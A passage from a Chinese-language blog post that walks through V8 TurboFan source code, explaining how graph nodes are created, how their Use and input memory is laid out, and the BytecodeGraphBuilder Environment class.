class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> common_; &#125;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">const</span> Operator* <span class="title">Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* CommonOperatorBuilder::Start(<span class="keyword">int</span> value_output_count) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator(                                    <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kStart, Operator::kFoldable | Operator::kNoThrow,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Start"</span>,                                                     <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, value_output_count, <span class="number">1</span>, <span class="number">1</span>);                          <span class="comment">// counts</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>这个文件还是比较有用的，common-operator.cc，因为NewNode的opcode参数从这里初始化。</strong><br>回到NewNode看一下<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Factory template for nodes with static input counts.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Nodes&gt;</span><br><span class="line">  <span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> NewNode(op, nodes_arr.size(), nodes_arr.data());</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"> Node* Graph::NewNode(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count, Node* <span class="keyword">const</span>* inputs,</span><br><span class="line">                     <span class="keyword">bool</span> incomplete) &#123;</span><br><span class="line">  Node* node = NewNodeUnchecked(op, input_count, inputs, incomplete);</span><br><span class="line">  Verifier::VerifyNode(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Node* Graph::NewNodeUnchecked(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span><br><span class="line">                              Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> incomplete) &#123;</span><br><span class="line">  Node* <span class="keyword">const</span> node =</span><br><span class="line">      Node::New(zone(), NextNodeId(), op, input_count, inputs, incomplete);</span><br><span class="line">  Decorate(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后是执行到了这里,于是我们来分析一下这个函数。</p><h4 id="Node-New"><a href="#Node-New" class="headerlink" title="Node::New"></a>Node::New</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Node* Node::New(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span><br><span class="line">                Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs) &#123;</span><br><span class="line">  Node** input_ptr;</span><br><span class="line">  Use* use_ptr;</span><br><span class="line">  Node* node;</span><br><span class="line">  <span class="keyword">bool</span> is_inline;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_count &gt; kMaxInlineCapacity) &#123;</span><br><span class="line">    <span class="comment">// Allocate out-of-line inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity =</span><br><span class="line">        has_extensible_inputs ? input_count + kMaxInlineCapacity : input_count;</span><br><span class="line">    OutOfLineInputs* outline = OutOfLineInputs::New(zone, capacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate node.</span></span><br><span class="line">    <span class="keyword">void</span>* node_buffer = zone-&gt;New(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, kOutlineMarker, <span class="number">0</span>);</span><br><span class="line">    node-&gt;inputs_.outline_ = outline;</span><br><span class="line"></span><br><span class="line">    outline-&gt;node_ = node;</span><br><span class="line">    outline-&gt;count_ = input_count;</span><br><span class="line"></span><br><span class="line">    input_ptr = outline-&gt;inputs_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(outline);</span><br><span class="line">    is_inline = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Allocate node with inline inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> max = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::min(input_count + <span class="number">3</span>, max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line">    <span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(size));</span><br><span class="line">    <span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br><span class="line"></span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, input_count, capacity);</span><br><span class="line">    input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(node);</span><br><span class="line">    is_inline = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initialize the input pointers and the uses.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">    Node* to = *inputs++;</span><br><span class="line">    input_ptr[current] = to;</span><br><span class="line">    Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">    use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br><span class="line">    to-&gt;AppendUse(use);</span><br><span class="line">  &#125;</span><br><span class="line">  node-&gt;Verify();</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了几个局部变量<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node** input_ptr;</span><br><span class="line">Use* use_ptr;</span><br><span class="line">Node* node;</span><br><span class="line"><span class="keyword">bool</span> is_inline;</span><br></pre></td></tr></table></figure></p><p><strong>然后判断input_count是否大于kMaxInineCapacity</strong><br>注意这里的input_count来自这里的nodes_arr.size()，此处对于start的情况，<code>NewNode(common()-&gt;Start(actual_parameter_count)));</code>，可以看出这个结果是0。<br>这是个比较特殊的情况，后面我们再分析几个node的生成看一下这个逻辑。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">  <span class="keyword">return</span> NewNode(op, nodes_arr.size(), nodes_arr.data());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>为什么这里有这样的一个比较呢？是因为v8对node的存储决定的<br>从注释里可以找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//============================================================================</span><br><span class="line">//== Memory layout ===========================================================</span><br><span class="line">//============================================================================</span><br><span class="line">// Saving space for big graphs is important. We use a memory layout trick to</span><br><span class="line">// be able to map &#123;Node&#125; objects to &#123;Use&#125; objects and vice-versa in a</span><br><span class="line">// space-efficient manner.</span><br><span class="line">//</span><br><span class="line">// &#123;Use&#125; links are laid out in memory directly before a &#123;Node&#125;, followed by</span><br><span class="line">// direct pointers to input &#123;Nodes&#125;.</span><br><span class="line">//</span><br><span class="line">// inline case:</span><br><span class="line">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">//          ^                              ^                  ^</span><br><span class="line">//          + Use                          + Node             + Input</span><br><span class="line">//</span><br><span class="line">// Since every &#123;Use&#125; instance records its &#123;input_index&#125;, pointer arithmetic</span><br><span class="line">// can compute the &#123;Node&#125;.</span><br><span class="line">//</span><br><span class="line">// out-of-line case:</span><br><span class="line">//     |Node xxxx |</span><br><span class="line">//     ^       + outline ------------------+</span><br><span class="line">//     +----------------------------------------+</span><br><span class="line">//                                         |    |</span><br><span class="line">//                                         v    | node</span><br><span class="line">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">//          ^                                                 ^</span><br><span class="line">//          + Use                                             + Input</span><br><span class="line">//</span><br><span class="line">// Out-of-line storage of input lists is needed if appending an input to</span><br><span class="line">// a node exceeds the maximum inline capacity.</span><br></pre></td></tr></table></figure></p><p>如果是小于kMaxInineCapacity，则可以直接将inputs内联在node中。<br>这里的计算方法是，首先计算capacity，默认应该是等于input_count，如果有<code>has_extensible_inputs</code>，则在input_count + 3和kMaxInlineCapacity选取一个最小值。<br><em>这个has_extensible_inputs我还不是很懂，后面看看吧</em><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> max = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::min(input_count + <span class="number">3</span>, max);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>然后计算size大小，并为node和它的use/input分配内存。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> size = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line"><span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(size));</span><br><span class="line"><span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br></pre></td></tr></table></figure></p><p>顺便说一下，一个Use大小是24字节，一个Node是40字节</p><p>计算好size之后进入这个函数，在这生成新的node。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Node::Node(NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> inline_count, <span class="keyword">int</span> inline_capacity)</span><br><span class="line">    : op_(op),</span><br><span class="line">      mark_(<span class="number">0</span>),</span><br><span class="line">      bit_field_(IdField::encode(id) | InlineCountField::encode(inline_count) |</span><br><span class="line">                 InlineCapacityField::encode(inline_capacity)),</span><br><span class="line">      first_use_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// Inputs must either be out of line or within the inline capacity.</span></span><br><span class="line">  DCHECK_GE(kMaxInlineCapacity, inline_capacity);</span><br><span class="line">  DCHECK(inline_count == kOutlineMarker || inline_count &lt;= inline_capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后需要为这个node建立input/use关系,这里的逻辑就是，首先根据当前node的input_count数。<br>依次设置to为input节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">  Node* to = *inputs++;</span><br></pre></td></tr></table></figure></p><p>然后由于input_ptr指向node的inputs区域，在node的inputs区域记录它的input节点的地址。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">...</span><br><span class="line">input_ptr[current] = to;</span><br></pre></td></tr></table></figure></p><p>通过这种方式就将节点的input关系建立好了。<br>然后需要考虑一下use关系，现在我们可以看到use_ptr指向的是当前node的地址。<br>通过use_ptr和{input_index}来计算出use，然后在use里记录当前{input_index}的值，于是我们可以通过这个值来做简单的算数计算来找到node。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">to-&gt;AppendUse(use);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> Node::AppendUse(Use* use) &#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  DCHECK_EQ(<span class="keyword">this</span>, *use-&gt;input_ptr());</span><br><span class="line">  use-&gt;next = first_use_;</span><br><span class="line">  use-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (first_use_) first_use_-&gt;prev = use;</span><br><span class="line">  first_use_ = use;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>于是从当前节点的input节点到当前节点，这样的一个{input}-&gt;{node}的use关系就建立起来了。<br>注意first_use是Node结构的一个成员变量。</p><p>或许这么说还是有点难懂，其实就是假设有一个节点A，它有0，1，2，3这么几个input节点，0，1，2，3代表的也是input_index。<br>然后对于每一个它的input节点，都要从它的Use部分取一个分配给它的input，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-05-122857.png" alt=""><br>然后因为分配出去的Use里面有记录这个input节点对应的input index，于是很容易就可以计算出来Node的地址。<br>这样，一个{input}-&gt;{node}的{Use #index}的关系就建立好了，而且很容易就可以通过#index来进行算数运算，得到真正的{input}-&gt;{node}，这样的use关系。</p><p><em>之所以需要这么麻烦，可能也是为了让graph IR有SSA的性质……</em></p><p>Node::New结束之后，此时Start节点已经被构建好了，请记住Node::New做的事情，因为后面建立新的node也是通过这个函数来完成的。</p><h4 id="BytecodeGraphBuilder-Environment"><a href="#BytecodeGraphBuilder-Environment" class="headerlink" title="BytecodeGraphBuilder::Environment"></a>BytecodeGraphBuilder::Environment</h4><p>回到<code>BytecodeGraphBuilder::CreateGraph()</code>来看一下，在Start创建之后，初始化env并切换到它。<br>在看env的初始化之前，先看一个重要的class<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The abstract execution environment simulates the content of the interpreter</span></span><br><span class="line"><span class="comment">// register file. The environment performs SSA-renaming of all tracked nodes at</span></span><br><span class="line"><span class="comment">// split and merge points in the control flow.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytecodeGraphBuilder</span>:</span>:Environment : <span class="keyword">public</span> ZoneObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Environment(BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count,</span><br><span class="line">              <span class="keyword">int</span> parameter_count,</span><br><span class="line">              interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">              Node* control_dependency);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Specifies whether environment binding methods should attach frame state</span></span><br><span class="line">  <span class="comment">// inputs to nodes representing the value being bound. This is done because</span></span><br><span class="line">  <span class="comment">// the &#123;OutputFrameStateCombine&#125; is closely related to the binding method.</span></span><br><span class="line">  <span class="keyword">enum</span> FrameStateAttachmentMode &#123; kAttachFrameState, kDontAttachFrameState &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">parameter_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_count_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_count_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">LookupAccumulator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupRegister</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupGeneratorState</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindAccumulator</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                       FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegister</span><span class="params">(interpreter::Register the_register, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                    FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegistersToProjections</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      interpreter::Register first_reg, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">      FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindGeneratorState</span><span class="params">(Node* node)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RecordAfterState</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                        FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Effect dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetEffectDependency</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> effect_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateEffectDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    effect_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Preserve a checkpoint of the environment for the IR graph. Any</span></span><br><span class="line">  <span class="comment">// further mutation of the environment will not affect checkpoints.</span></span><br><span class="line">  <span class="function">Node* <span class="title">Checkpoint</span><span class="params">(BailoutId bytecode_offset, OutputFrameStateCombine combine,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Control dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetControlDependency</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> control_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateControlDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    control_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">Context</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> context_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetContext</span><span class="params">(Node* new_context)</span> </span>&#123; context_ = new_context; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Environment* <span class="title">Copy</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(Environment* other, <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">FillWithOsrValues</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoop</span><span class="params">(<span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoopExit</span><span class="params">(Node* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Environment</span><span class="params">(<span class="keyword">const</span> Environment* copy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">StateValuesRequireUpdate</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateStateValues</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">GetStateValuesFromCache</span><span class="params">(Node** values, <span class="keyword">int</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> BitVector* liveness, <span class="keyword">int</span> liveness_offset)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">RegisterToValuesIndex</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">Zone* <span class="title">zone</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;local_zone(); &#125;</span><br><span class="line">  <span class="function">Graph* <span class="title">graph</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;graph(); &#125;</span><br><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;common(); &#125;</span><br><span class="line">  <span class="function">BytecodeGraphBuilder* <span class="title">builder</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> NodeVector* <span class="title">values</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function">NodeVector* <span class="title">values</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_base_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">accumulator_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> accumulator_base_; &#125;</span><br><span class="line"></span><br><span class="line">  BytecodeGraphBuilder* builder_;</span><br><span class="line">  <span class="keyword">int</span> register_count_;</span><br><span class="line">  <span class="keyword">int</span> parameter_count_;</span><br><span class="line">  Node* context_;</span><br><span class="line">  Node* control_dependency_;</span><br><span class="line">  Node* effect_dependency_;</span><br><span class="line">  NodeVector values_;</span><br><span class="line">  Node* parameters_state_values_;</span><br><span class="line">  Node* generator_state_;</span><br><span class="line">  <span 